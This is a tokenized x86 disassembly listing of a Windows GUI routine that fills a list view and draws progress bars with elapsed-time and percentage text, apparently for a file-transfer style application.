mov ecx esi
call sub_4531e0
sub_453420
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x3fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax * 4 ]
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_42c600
sub_453480
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0810
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
mov edi [ esi + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_4531e0
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x2
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_448080
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_420d50
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 4 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_448080
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461a40
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp + 0x10 ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_4b2200
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_453050
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push edi
call sub_420d80
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 4 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx ebx
lea eax [ ebx + edi * 4 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_453720
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_453480
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_453790
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_42c680
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_453800
push 0xffffffff
push sub_4c082b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x294
mov eax [ esp + 0x2a4 ]
push ebx
push ebp
push esi
push edi
push 0xce6
xor ebx ebx
push eax
mov [ esp + 0x18 ] ebx
call [ GetDlgItem@IAT ]
mov ecx rw-data
mov ebp eax
mov [ esp + 0x78 ] ecx
call sub_404310
mov esi [ esp + 0x2b8 ]
cmp esi ebx
mov [ esp + 0x2ac ] ebx
jl r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
mov ecx [ rw-data ]
cmp ecx ebx
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov edi [ ecx + esi * 4 ]
cmp edi ebx
je r-xdata
cmp esi eax
jge r-xdata
lea ecx [ esp + 0x7c ]
push ecx
push ebx
push 0x1005
mov [ esp + 0x90 ] ebx
mov [ esp + 0x20 ] ebx
mov ebx [ SendMessageA@IAT ]
push ebp
mov [ esp + 0x8c ] 0xa
mov [ esp + 0x9c ] 0x2
mov [ esp + 0x90 ] esi
call ebx
mov eax [ edi + 0x28 ]
dec eax
cmp eax 0xe
mov [ esp + 0x18 ] 0x0
ja r-xdata
mov [ esp + 0xa4 ] 0x0
jmp [ eax * 4 + jump_table_4543f8 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x102d
lea edx [ esp + 0x1b0 ]
push ebp
mov [ esp + 0x58 ] 0x2
mov [ esp + 0x68 ] 0x100
mov [ esp + 0x64 ] edx
call ebx
cmp [ edi + 0x28 ] 0x8
lea ecx [ esp + 0xa4 ]
lea edx [ esp + 0x1a4 ]
push ecx
push edx
jne r-xdata
lea ecx [ esp + 0x1c ]
push ecx
push esi
push 0x1038
push ebp
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x2c ] 0x1
call ebx
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x7c ]
push eax
push 0x0
push 0x1006
push ebp
mov [ esp + 0xa8 ] edx
call ebx
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
push ebp
call [ InvalidateRect@IAT ]
mov [ esp + 0x10 ] 0x1
mov eax 0x1
push r--data
lea edx [ esp + 0xa8 ]
push edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] eax
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea eax [ esp + 0xa8 ]
push eax
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x1c ] 0x2
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea ecx [ esp + 0xa8 ]
push ecx
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x1c ] 0x2
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea edx [ esp + 0xa8 ]
push edx
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x1c ] 0x3
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea eax [ esp + 0xa8 ]
push eax
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x1c ] 0x4
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea ecx [ esp + 0xa8 ]
push ecx
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x1c ] 0x5
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea edx [ esp + 0xa8 ]
push edx
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x1c ] 0x6
call [ lstrcpyA@IAT ]
jmp r-xdata
mov eax 0x1
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] eax
push r--data
lea eax [ esp + 0xa8 ]
push eax
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea ecx [ esp + 0xa8 ]
push ecx
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x1c ] 0x7
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea edx [ esp + 0xa8 ]
push edx
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x1c ] 0x8
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea eax [ esp + 0xa8 ]
push eax
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x1c ] 0x9
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea ecx [ esp + 0xa8 ]
push ecx
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x1c ] 0xa
call [ lstrcpyA@IAT ]
jmp r-xdata
push r--data
lea edx [ esp + 0xa8 ]
push edx
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x1c ] 0xb
call [ lstrcpyA@IAT ]
jmp r-xdata
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ esp + 0x98 ] eax
je r-xdata
lea edx [ esp + 0x40 ]
push edx
push esi
push 0x102d
lea ecx [ esp + 0x1b0 ]
push ebp
mov [ esp + 0x58 ] 0x3
mov [ esp + 0x68 ] 0x100
mov [ esp + 0x64 ] ecx
call ebx
mov eax [ esp + 0x18 ]
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0x40 ]
push ecx
push esi
push 0x102e
lea eax [ esp + 0xb0 ]
push ebp
mov [ esp + 0x58 ] 0x2
mov [ esp + 0x64 ] eax
call ebx
lea edx [ esp + 0x1c ]
push edx
push esi
push 0x1038
push ebp
mov [ esp + 0x30 ] 0x2
mov [ esp + 0x2c ] 0x0
call ebx
push 0x0
lea eax [ esp + 0x20 ]
push eax
push ebp
call [ InvalidateRect@IAT ]
lea edx [ esp + 0x1c ]
push edx
push esi
push 0x1038
push ebp
mov [ esp + 0x30 ] 0x2
mov [ esp + 0x2c ] 0x0
call ebx
lea eax [ esp + 0x1c ]
push eax
push ebp
call [ ValidateRect@IAT ]
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x28 ]
inc eax
dec esi
push ebp
mov [ esp + 0x20 ] eax
mov [ esp + 0x2c ] esi
call [ GetDC@IAT ]
mov esi eax
push 0x1
push esi
call [ SetBkMode@IAT ]
push 0x0
push 0x0
push 0x31
push ebp
call ebx
push eax
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x2c ] eax
call [ GetTickCount@IAT ]
mov ecx [ edi + 0x54 ]
mov [ esp + 0x14 ] eax
sub eax ecx
mov [ esp + 0x10 ] eax
jne r-xdata
lea ecx [ esp + 0x40 ]
push ecx
push esi
push 0x102e
lea eax [ esp + 0xb0 ]
push ebp
mov [ esp + 0x58 ] 0x2
mov [ esp + 0x64 ] eax
call ebx
cmp eax 0x2
jne r-xdata
call [ GetTickCount@IAT ]
mov edx [ edi + 0xa0 ]
mov ecx eax
sub ecx edx
mov eax 0x10624dd3
mul ecx
mov eax edx
xor edx edx
mov [ esp + 0x2c ] ecx
shr eax 0x6
mov ecx 0x3c
div ecx
mov eax 0x45e7b273
push edx
mul [ esp + 0x30 ]
shr edx 0xe
push edx
lea edx [ esp + 0xac ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
jmp r-xdata
mov ecx [ edi + 0x34 ]
mov eax [ edi + 0x30 ]
mov edx [ edi + 0x5c ]
push 0x0
or eax ecx
mov ecx [ edi + 0x58 ]
push 0xa
jne r-xdata
mov [ esp + 0x10 ] 0x1
mov [ esp + 0xa4 ] 0x0
mov ecx [ edi + 0xf4 ]
mov eax 0x10624dd3
mul ecx
mov eax edx
xor edx edx
shr eax 0x6
mov ecx 0x3c
div ecx
mov eax 0x45e7b273
push edx
mul [ edi + 0xf4 ]
shr edx 0xe
push edx
lea edx [ esp + 0xac ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
jmp r-xdata
lea eax [ esp + 0xa4 ]
push eax
lea ecx [ esp + 0x1a8 ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov ebx [ edi + 0x48 ]
mov eax [ edi + 0x4c ]
sub ebx ecx
sbb eax edx
push eax
push ebx
mov [ esp + 0x44 ] eax
call sub_4b6490
xor ecx ecx
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_4b61c0
push 0x0
push 0xa
push edx
push eax
call sub_4b6a30
mov edx [ esp + 0x10 ]
push eax
xor eax eax
push eax
mov eax [ esp + 0x3c ]
push edx
push eax
push ebx
call sub_4b61c0
push eax
mov eax [ edi + 0x4c ]
push 0x0
push 0x64
push eax
mov eax [ edi + 0x48 ]
push eax
call sub_4b6490
mov ecx [ edi + 0x34 ]
push ecx
mov ecx [ edi + 0x30 ]
push ecx
push edx
push eax
call sub_4b61c0
push eax
lea ecx [ esp + 0xb0 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov edx [ edi + 0x4c ]
mov eax [ edi + 0x48 ]
add esp 0x14
push 0x0
push 0x64
push edx
push eax
call sub_4b6490
mov ecx [ edi + 0x34 ]
push ecx
mov ecx [ edi + 0x30 ]
push ecx
push edx
push eax
call sub_4b61c0
mov ebx [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0x74 ] ebx
mov ebx [ esp + 0x20 ]
mov [ esp + 0x6c ] ecx
mov ecx [ esp + 0x24 ]
mov [ esp + 0x34 ] ebx
mov ebx [ esp + 0x28 ]
push 0x64
mov [ esp + 0x74 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x6c ] edx
mov [ esp + 0x34 ] edx
mov [ esp + 0x40 ] ebx
push eax
sub ecx edx
push ecx
call [ MulDiv@IAT ]
mov ecx [ esp + 0x30 ]
mov ebx [ FillRect@IAT ]
push 0xe
lea edx [ esp + 0x34 ]
push edx
add eax ecx
push esi
mov [ esp + 0x44 ] eax
call ebx
mov eax [ esp + 0x38 ]
push 0x6
lea ecx [ esp + 0x6c ]
push ecx
push esi
mov [ esp + 0x74 ] eax
call ebx
lea edx [ esp + 0x30 ]
push edx
call [ CreateRectRgnIndirect@IAT ]
mov ebx [ SelectClipRgn@IAT ]
push eax
push esi
mov [ esp + 0x18 ] eax
call ebx
push 0xf
call [ GetSysColor@IAT ]
push eax
push esi
call [ SetTextColor@IAT ]
push 0x24
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0xac ]
push ecx
call [ lstrlenA@IAT ]
push eax
lea edx [ esp + 0xb0 ]
push edx
push esi
call [ DrawTextA@IAT ]
push 0x0
push esi
call ebx
mov eax [ esp + 0x10 ]
push eax
call [ DeleteObject@IAT ]
lea ecx [ esp + 0x68 ]
push ecx
call [ CreateRectRgnIndirect@IAT ]
push eax
push esi
mov [ esp + 0x18 ] eax
call ebx
push 0x2
call [ GetSysColor@IAT ]
push eax
push esi
call [ SetTextColor@IAT ]
push 0x24
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0xac ]
push eax
call [ lstrlenA@IAT ]
push eax
lea ecx [ esp + 0xb0 ]
push ecx
push esi
call [ DrawTextA@IAT ]
push 0x0
push esi
call ebx
mov edx [ esp + 0x10 ]
push edx
call [ DeleteObject@IAT ]
mov ebx [ SendMessageA@IAT ]
mov eax [ edi + 0x48 ]
sub eax ecx
mov ecx [ edi + 0x4c ]
sbb ecx edx
push ecx
push eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] ecx
call sub_4b6490
xor ecx ecx
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_4b61c0
push 0x0
push 0xa
push edx
push eax
call sub_4b6a30
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x30 ]
push eax
xor eax eax
push eax
mov eax [ esp + 0x3c ]
push edx
push eax
push ecx
call sub_4b61c0
push eax
lea edx [ esp + 0xac ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
push 0x6
lea eax [ esp + 0x20 ]
push eax
push esi
call [ FillRect@IAT ]
push 0x24
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0xac ]
push edx
call [ lstrlenA@IAT ]
push eax
lea eax [ esp + 0xb0 ]
push eax
push esi
call [ DrawTextA@IAT ]
jmp r-xdata
mov eax [ edi + 0x8c ]
test eax eax
jl r-xdata
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x102e
lea edx [ esp + 0xb0 ]
push ebp
mov [ esp + 0x58 ] 0x3
mov [ esp + 0x64 ] edx
call ebx
lea ecx [ esp + 0x1c ]
push ecx
push esi
push 0x1038
push ebp
mov [ esp + 0x30 ] 0x3
mov [ esp + 0x2c ] 0x0
call ebx
mov al [ esp + 0x2c0 ]
test al al
jne r-xdata
mov [ esp + 0x10 ] 0x1
mov eax [ esp + 0x14 ]
mov ecx [ edi + 0x48 ]
mov edx [ edi + 0x4c ]
mov [ edi + 0x54 ] eax
mov eax [ esp + 0x2c ]
push eax
push esi
mov [ edi + 0x58 ] ecx
mov [ edi + 0x5c ] edx
call [ SelectObject@IAT ]
push esi
push ebp
call [ ReleaseDC@IAT ]
mov esi [ esp + 0x2b8 ]
jmp r-xdata
cmp [ edi + 0x90 ] 0x0
jbe r-xdata
jg r-xdata
push ebp
call [ GetDC@IAT ]
mov esi eax
push 0x2
push esi
call [ SetBkMode@IAT ]
test [ esp + 0x88 ] 0x2
je r-xdata
lea edx [ esp + 0x1c ]
push edx
push ebp
call [ ValidateRect@IAT ]
cmp [ esp + 0x2bc ] esi
jne r-xdata
lea ecx [ esp + 0x40 ]
push ecx
push esi
push 0x102d
lea eax [ esp + 0x1b0 ]
push ebp
mov [ esp + 0x58 ] 0x5
mov [ esp + 0x68 ] 0x100
mov [ esp + 0x64 ] eax
call ebx
mov ecx [ edi + 0x90 ]
lea edx [ esp + 0xa4 ]
push edx
mov edx [ edi + 0x94 ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ edi + 0x98 ]
mov [ eax + 0x4 ] edx
mov edx [ edi + 0x9c ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
call sub_452710
add esp 0x14
lea eax [ esp + 0xa4 ]
push eax
lea ecx [ esp + 0x1a8 ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x40 ]
push edx
push esi
push 0x102d
lea ecx [ esp + 0x1b0 ]
push ebp
mov [ esp + 0x58 ] 0x4
mov [ esp + 0x68 ] 0x100
mov [ esp + 0x64 ] ecx
call ebx
mov ecx [ edi + 0x8c ]
mov edx [ edi + 0x88 ]
push 0x1
lea eax [ esp + 0xa8 ]
push eax
push ecx
push edx
call sub_4359e0
add esp 0x10
lea eax [ esp + 0xa4 ]
push eax
lea ecx [ esp + 0x1a8 ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x88 ]
test eax eax
jbe r-xdata
push 0x5
call [ GetSysColor@IAT ]
push eax
push esi
call [ SetBkColor@IAT ]
push 0x8
call [ GetFocus@IAT ]
cmp eax ebp
jne r-xdata
mov ecx rw-data
call sub_401420
mov eax [ esp + 0x10 ]
jmp r-xdata
mov esi [ esp + 0x2b4 ]
mov ebx [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0xe
push 0xcec
push esi
call ebx
mov edx [ edi + 0xec ]
cmp eax edx
je r-xdata
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x102e
lea edx [ esp + 0xb0 ]
push ebp
mov [ esp + 0x58 ] 0x5
mov [ esp + 0x64 ] edx
call ebx
lea ecx [ esp + 0x1c ]
push ecx
push esi
push 0x1038
push ebp
mov [ esp + 0x30 ] 0x5
mov [ esp + 0x2c ] 0x0
call ebx
push 0x0
lea edx [ esp + 0x20 ]
push edx
push ebp
call [ InvalidateRect@IAT ]
mov [ esp + 0x10 ] 0x1
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x102e
lea edx [ esp + 0xb0 ]
push ebp
mov [ esp + 0x58 ] 0x4
mov [ esp + 0x64 ] edx
call ebx
lea ecx [ esp + 0x1c ]
push ecx
push esi
push 0x1038
push ebp
mov [ esp + 0x30 ] 0x4
mov [ esp + 0x2c ] 0x0
call ebx
push 0x0
lea edx [ esp + 0x20 ]
push edx
push ebp
call [ InvalidateRect@IAT ]
mov [ esp + 0x10 ] 0x1
push 0xd
call [ GetSysColor@IAT ]
push eax
push esi
call [ SetBkColor@IAT ]
push 0xe
jmp r-xdata
mov ecx [ esp + 0x2a4 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x2a0
retn
cmp [ edi + 0xf0 ] 0x10
jb r-xdata
call [ GetSysColor@IAT ]
push eax
push esi
call [ SetTextColor@IAT ]
push 0x0
push 0x0
push 0x31
push ebp
call ebx
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x1c ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x24 ]
sub eax 0x6
add ecx 0x4
mov [ esp + 0x24 ] eax
push 0x40026
lea eax [ esp + 0x20 ]
mov [ esp + 0x20 ] ecx
push eax
lea ecx [ esp + 0xac ]
push ecx
call [ lstrlenA@IAT ]
push eax
lea edx [ esp + 0xb0 ]
push edx
push esi
call [ DrawTextA@IAT ]
mov eax [ esp + 0x2c ]
push eax
push esi
call [ SelectObject@IAT ]
push esi
push ebp
call [ ReleaseDC@IAT ]
mov esi [ esp + 0x2b8 ]
mov [ esp + 0x10 ] 0x1
add edi 0xdc
mov edi [ edi + 0xdc ]
jmp r-xdata
push edi
push 0x0
push 0xc
push 0xcec
push esi
call ebx
push 0x3e8
push 0x0
push 0xb6
xor ecx ecx
cmp edx 0xfa00
jb r-xdata
cmp [ ecx + edi ] 0xa
jne r-xdata
cmp al 0xa
je r-xdata
cmp [ ecx + edi ] 0x0
je r-xdata
inc ecx
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
lea eax [ ecx + edi ]
cmp [ eax ] 0x0
je r-xdata
mov eax edx
sub eax ecx
cmp eax 0xfa00
jl r-xdata
inc ecx
jmp r-xdata
mov al [ ecx + edi + 0x2 ]
add ecx 0x2
test al al
jne r-xdata
mov [ esp + 0x10 ] 0x1
push eax
push 0x0
push 0xc
jmp r-xdata
mov al [ ecx + edi ]
test al al
je r-xdata
push 0xcec
push esi
call ebx
sub_454440
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c084b
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
sub esp 0x204
push ebx
push ebp
push esi
push edi
push 0x200
push eax
lea ecx [ esp + 0x1c ]
xor edi edi
push ecx
mov [ rw-data ] edi
call [ lstrcpynA@IAT ]
lea esi [ esp + 0x14 ]
call sub_452590
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov ecx [ rw-data ]
push edi
push 0x2
push edi
lea eax [ esp + 0x20 ]
push eax
push ecx
call sub_4b1c90
add esp 0x14
lea edx [ esp + 0x14 ]
push edx
push 0x2
push 0x1410
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
sub eax ebp
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx rw-data
call sub_404310
mov ebp [ rw-data ]
mov ecx rw-data
call sub_401420
xor eax eax
mov edx [ ebp + edi * 4 ]
lea eax [ esp + 0x14 ]
add edx 0x8
lea esi [ eax + 0x1 ]
cmp edi eax
jge r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ edx + 0x14 ]
sub eax esi
test ebx ebx
je r-xdata
cmp ebx eax
jb r-xdata
cmp ebx eax
mov ecx ebx
jb r-xdata
inc edi
jmp r-xdata
xor edx edx
cmp ebx eax
setne dl
test edx edx
je r-xdata
cmp [ edx + 0x18 ] 0x10
jb r-xdata
mov ecx eax
test ebp ebp
mov [ esp + 0x10 ] edi
jne r-xdata
mov eax [ ebp + edi * 4 ]
mov [ rw-data ] eax
mov eax [ eax + 0x28 ]
cmp eax 0xf
je r-xdata
add edx 0x4
mov edx [ edx + 0x4 ]
jmp r-xdata
cmp eax 0xe
je r-xdata
test edx edx
mov edi [ esp + 0x10 ]
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov esi edx
lea edi [ esp + 0x14 ]
xor edx edx
[ esi ] [ edi ]
je r-xdata
cmp eax 0xb
je r-xdata
mov ecx rw-data
call sub_401420
mov eax 0x1
jmp r-xdata
mov ecx [ esp + 0x214 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x210
retn
sub_4545a0
push 0xffffffff
push sub_4c08b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x29c
push ebx
push ebp
mov ebp [ esp + 0x2b8 ]
mov eax [ ebp + 0x4 ]
xor ebx ebx
cmp eax ebx
mov [ esp + 0x68 ] ebx
je r-xdata
push esi
mov ecx 0xf
push edi
mov [ esp + 0x50 ] ecx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x2b4 ] ebx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] 0x0
mov esi [ esp + 0x2bc ]
mov al [ esi ]
test al al
mov [ esp + 0x2b4 ] 0x1
mov edi esi
je r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
cmp edx 0x3e8
jbe r-xdata
cmp [ edi ] 0x0
jne r-xdata
lea esp [ esp ]
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0x29c ]
mov [ fs : 0x0 ] ecx
add esp 0x2a8
retn
mov edx edi
sub edx esi
push edx
push esi
lea ecx [ esp + 0x40 ]
call sub_401e80
inc edi
mov [ esp + 0x14 ] edi
xor ebp ebp
mov ecx edi
mov eax esi
mov [ esp + 0x6c ] ecx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x58 ] 0x0
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x39
jg r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x5c ]
call sub_401e80
lea ecx [ esp + 0x54 ]
push ecx
mov ecx ebp
mov [ esp + 0x2b8 ] 0x2
call sub_407460
mov eax [ esp + 0x6c ]
mov edi 0x10
cmp eax edi
jb r-xdata
cmp al 0x5b
je r-xdata
jmp r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x5a
